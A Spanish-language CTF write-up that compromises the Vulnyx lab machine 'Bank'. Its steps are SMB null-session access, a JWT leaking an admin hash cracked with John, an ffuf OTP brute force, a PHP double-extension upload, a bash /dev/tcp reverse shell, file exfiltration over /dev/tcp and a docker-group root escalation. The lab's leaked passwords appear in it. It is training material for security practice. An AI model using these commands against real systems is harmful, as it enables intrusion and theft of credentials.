---
creator: nohh022
pubDatetime: 2026-05-08T00:01:00Z
title: Bank
slug: bank
platform: Vulnyx
ogImage: ../../assets/images/vulnyx/bank/bank.jpg
featured: true
tags:
  - linux
  - jwt
  - docker
  - file upload
  - smb linux
description:
  Write up de la máquina Bank de la plataforma Vulnyx
---

![logo](../../assets/images/vulnyx/bank/bank.jpg)

## Table of contents

## Enumeración

Nuestra máquina tiene la ip **192.168.0.23**

La máquina Bank tiene la ip **192.168.0.25**  

### Descubrimiento de Puertos

Vamos a empezar enumerando todos los puertos abiertos de la máquina, así como los servicios y las versiones que se están ejecutando en ellos mediante la herramienta **nmap**.

```bash
nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 192.168.0.25

Nmap scan report for 10.0.2.32
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://bank.nyx/
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:F3:F6:E5 (Oracle VirtualBox virtual NIC)
Service Info: Host: bank.nyx

Host script results:
| smb2-time: 
|   date: 2026-05-06T13:45:28
|_  start_date: N/A
|_clock-skew: 1s
|_nbstat: NetBIOS name: BANK, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

### Puerto 139 y 445 (SMB)

Vamos a enumerar el contenido del **smb** utilizando **smbmap** y una **null session**

```bash
smbmap -H 192.168.0.25 -u "" -p ""

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.0.25:445        Name: bank.nyx                  Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        development                                             READ ONLY
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u1)
        nobody                                                  NO ACCESS       Home Directories
[*] Closed 1 connections 
```

Tenemos un directorio **development** sobre el que disponemos de permisos de lectura, así que vamos a conectarnos al servicio **smb** con una **null session** y acceder al contenido de dicho directorio.

```bash
smbclient //192.168.0.25/development -N

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May  3 06:43:20 2026
  ..                                  D        0  Sun May  3 06:43:20 2026
  03-may-26.txt                       N     1141  Sun May  3 06:43:20 2026
```
Nos descargamos el archivo **03-may-26.txt**, cuyo contenido es:

```text
Subject: AI Agent Integration & Development Environment Setup

To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
For this reason, it is important to maintain strict attention to security and validate all critical operations.

A dedicated development directory has been enabled where developers can access and test the application.
Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174

Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
to ensure everything is properly configured.

Best regards,
Marcelo
```
El archivo habla sobre un directorio de la web que aún se encuentra en desarrollo, **/development-0119-d5e051a-9da2-12sdas1-775-e0174** y sobre tres nombres de usuario: marcelo,juan y lucas.

### Puerto 80 (Web)

Como hemos visto en el reporte de **nmap** se está aplicando **Virtual Hosting**, por lo que tenemos que agregar la ip de la máquina y el dominio, **bank.nyx**, al **/etc/hosts**

```bash
echo "192.168.0.25  bank.nyx" | tee -a /etc/hosts
```

Ahora si podemos acceder al dominio. Accedemos al dominio y al directorio **/development-0119-d5e051a-9da2-12sdas1-775-e0174** que es el que nos interesa, ya que en el resto no hay nada útil.

![login](../../assets/images/vulnyx/bank/login.jpg)

Tenemos un panel que nos permite tanto loguearnos como registrarnos. Como no disponemos de credenciales, mediante fuerza bruta no se logró obtener nada, nos registramos con un usuario **test1** y accedemos.

Nos encontramos con:

- Un panel para enviar dinero a usuarios del sistema, un botón para verificar la existencia de los usuarios y un panel que nos muestra las transacciones.

- Un apartado de perfil que nos permite modificar nuestra contraseña. Para actualizar la imagen de perfil debemos de ser el administrador.

Vamos a enumerar los subdirectorios del directorio development utilizando **gobuster**

```bash
gobuster dir -u "http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 2917]
uploads              (Status: 301) [Size: 394] [--> http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/]
admin.php            (Status: 302) [Size: 0] [--> index.php]
```

Encontramos:

- Un directorio **uploads** que no contiene nada

- Un **admin.php** al cual no tenemos acceso.

## Explotación

Vamos a revisar las funciones de la web a ver si con alguna de ellas conseguimos convertirnos en admin. 

La función que nos va a ser útil es **verify**, que se encarga de verificar si un usuario existe o no. Para ello vamos a interceptar su petición con **burpsuite**

![verify](../../assets/images/vulnyx/bank/verify.jpg)

La petición envía por **POST** un campo **username** y otro **verify_recipient** en el **body**.
Si tratamos de verificar al usuario **admin** la respuesta nos muestra una cabezera extraña que contiene un **jwt** (**Json Web Token**).

![burpsuite](../../assets/images/vulnyx/bank/burpsuite-verify.jpg)

Utilizamos la web de https://www.jwt.io/ para decodificar el **payload** del **jwt**.

![admin-jwt](../../assets/images/vulnyx/bank/admin-jwt.jpg)

Podemos ver la contraseña de **admin**, así que la guardamos en un **hash.txt** y empleamos **John the Ripper** para crackearla.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (?)     
1g 0:00:00:08 DONE (2026-05-07 11:43) 0.1146g/s 20.64p/s 20.64c/s 20.64C/s peanut..kisses
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ya tenemos las credenciales de **admin:blink182**, así que entramos con ellas. 

![otp](../../assets/images/vulnyx/bank/otp.jpg)

Se nos pide un **otp** (**One-Time Password**). No sabemos ni la longitud ni el tipo de caracteres usados, numéricos o alfanuméricos, así que tenemos que probar diferentes combinaciones. 

Tras muchas pruebas y tiempo, lo conseguimos:

Primero creamos una lista de números del 0 al 999999 con formato de 6 caracteres.

```bash
seq -w 0 999999 > nums.txt
```

Ahora empleamos **ffuf** para automatizar la prueba de **otps**. Guardamos el valor de la cookie de autenticación del usuario **admin** llamada **auth_token** en un archivo cookie, para que no tener un comando demasiado largo.

```bash
ffuf -c -u "http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: $(cat cookie)" -X POST -d 'otp=FUZZ&verify_otp=' -w nums.txt -fr "Error:" -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php
 :: Wordlist         : FUZZ: /home/kali/Desktop/machines/Vulnyx/Bank/nums.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cCI6MTc3ODE3MjI1NSwib3RwIjozODg1MDYsImF0dGVtcHRzIjozLCJvdHBfdmVyaWZpZWQiOmZhbHNlfQ.Dy1WLBvMIdrW_EYVA53sstGgAwuNGckZHnlzT8eZ-VY
 :: Data             : otp=FUZZ&verify_otp=
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Error:
________________________________________________

388506                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 141ms]
```

Obtenemos **388506** y entramos como **admin**

Tenemos acceso al panel de administrador pero lo que nos interesa es el apartado para subir imágenes, ya que durante la enumeración encontramos un apartado de **uploads**, así que podemos intentar subir un archivo **php**.

![upload-image](../../assets/images/vulnyx/bank/upload-image.jpg)

Si tratamos de subir un archivo **php** no nos lo permite y nos exige subir **jpeg**, **png** o **gif**, por lo que vamos a usar **burpsuite** para tratar de bypasser esta restricción.

Si subimos una imagen de cierto gato naranja vemos que se nos devuelve un **Internal Server Error**

![up-garfiedl](../../assets/images/vulnyx/bank/up-garfield.jpg)

Pero si revisamos el directorio **/uploads** vemos que se ha subido la imagen, por lo que este error nos indica éxito en la subida de archivos.

![uploads-with-garfield](../../assets/images/vulnyx/bank/uploads-with-garfield.jpg)

Vamos a eliminar casi todos los datos de la imagen y colocar en entre los que dejemos código de **php** y utilizamos la técnica de la doble extensión en el nombre del archivo, llamamos al archivo **shell.jpeg.php**

![shell-image](../../assets/images/vulnyx/bank/shell-image.jpg)

Hemos conseguido subir el archivo malicioso, por lo que vamos al directorio uploads y a nuestra shell.jpeg.php

![RCE](../../assets/images/vulnyx/bank/rce.jpg)

Tenemos **RCE**, por lo que nos ponemos en escucha en nuestra máquina con **netcat**

```bash
nc -nlvp 443
```

Y en el parámetro **cmd** de la url ponemos la reverse shell

```bash
bash -c 'bash -i >%26 /dev/tcp/192.168.0.23/443 0>%261'
```

Entramos como **www-data**

## Escalada de Privilegios
### Marcelo

Revisamos el contenido del directorio del **smb** y encontramos una base de datos con contraseñas y una nota.

```bash
www-data@bank:/$ ls -la /srv/smb/passwords/
total 16
drwxrwxrwx 2 root root 4096 May  3 06:53 .
drwxrwxr-x 4 root root 4096 May  3 06:43 ..
-rw-rw-r-- 1 juan juan  383 May  3 06:53 note.txt
-rw-rw-r-- 1 juan juan 2277 May  3 06:51 passwords.kdbx
```

Si abrimos **note.txt**

```text
Hey, as you said Marcelo, I’ve already left a KeePass file with all the system passwords you asked me to create, except for the root password. 
The KeePass password is: `@zm{2h8aUu'a_M;'Jd:!MAQ?zn

Delete it after reading, but don’t worry—I think I’ve configured this directory properly so only you can access 
it, and it’s not exposed on the SMB service either.

— Juan
```

Conseguimos la contraseña del **passwords.kdbx**, así que nos lo pasamos a nuestro equipo para abrirlo.

En nuestro equipo 

```bash 
nc -nlvp 100 > passwords.kdbx
```

En la máquina 

```bash
cat passwords.kdbx > /dev/tcp/192.168.0.23/100
```

Ahora que tenemos el archivo lo vamos a abrir usando **keepass2** 

```bash
keepass2 passwords.kdbx
```

Introducimos la contraseña que aparece en el note.txt y vemos que tenemos acceso a la contraseña de tres usuarios del servidor

![keepass](../../assets/images/vulnyx/bank/keepass.jpg)

Hacemos doble click sobre cada una de ellas y nos la copia en la clipboard durante unos segundos, así que es importante guardarlas en algún archivo.

Usamos la password de **marcelo** y nos convertimos en él.

```bash
marcelo@bank:~$ ls -la
total 28
drwx------ 3 marcelo marcelo 4096 May  5 11:07 .
drwxr-xr-x 5 root    root    4096 May  3 07:30 ..
lrwxrwxrwx 1 root    root       9 May  3 07:29 .bash_history -> /dev/null
-rw-r--r-- 1 marcelo marcelo  220 May  1 07:37 .bash_logout
-rw-r--r-- 1 marcelo marcelo 3526 May  1 07:37 .bashrc
drwxrwxr-x 3 marcelo marcelo 4096 May  3 06:13 .local
lrwxrwxrwx 1 root    root       9 May  3 07:29 .mysql_history -> /dev/null
-rw-r--r-- 1 marcelo marcelo  807 May  1 07:37 .profile
lrwxrwxrwx 1 root    root       9 May  5 11:07 .sqlite_history -> /dev/null
-rw-rw-r-- 1 marcelo marcelo   33 May  3 07:02 user.txt
lrwxrwxrwx 1 root    root       9 May  3 07:29 .zsh_history -> /dev/null
```

### Root

Si revisamos los grupos a los que pertenece nuestro usuario vemos el grupo **docker**. Podemos abusar de este grupo para convertirnos en root.

```bash
marcelo@bank:~$ id
uid=1000(marcelo) gid=1000(marcelo) groups=1000(marcelo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),105(docker)
```

**Nota**: Si la máquina no tiene conexión a internet deberemos de bajar el contenedor de **alpine** en nuestro equipo y pasarlo a ella.

Vamos a usar **docker** para montar la raíz del sistema en **/mnt** dentro de un contenedor **alpine**. Después, mediante **chroot**, cambiamos la raíz del proceso al sistema montado en el directorio **/mnt**, obteniendo una **shell** como **root** sobre el host.

```bash
marcelo@bank:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

De esta forma se nos lanza una shell como **root**

```bash
root@88ed1ae87012:/# whoami
root
root@88ed1ae87012:/# ls -la /root
total 36
drwx------  4 root root 4096 May  5 11:10 .
drwxr-xr-x 18 root root 4096 May  6 12:27 ..
lrwxrwxrwx  1 root root    9 May  3 07:29 .bash_history -> /dev/null
-rw-r--r--  1 root root  607 Mar  2 16:50 .bashrc
-rwxr-xr-x  1 root root  137 May  5 10:44 .cron-issue
drwxrwxr-x  3 root root 4096 May  1 08:41 .local
lrwxrwxrwx  1 root root    9 May  5 11:10 .mariadb_history -> /dev/null
lrwxrwxrwx  1 root root    9 May  3 07:29 .mysql_history -> /dev/null
-rw-r--r--  1 root root  132 Mar  2 16:50 .profile
-rw-r--r--  1 root root   66 May  5 07:33 .selected_editor
drwx------  2 root root 4096 May  1 07:32 .ssh
lrwxrwxrwx  1 root root    9 May  3 07:29 .zsh_history -> /dev/null
-rw-rw-r--  1 root root   33 May  3 07:25 root.txt
```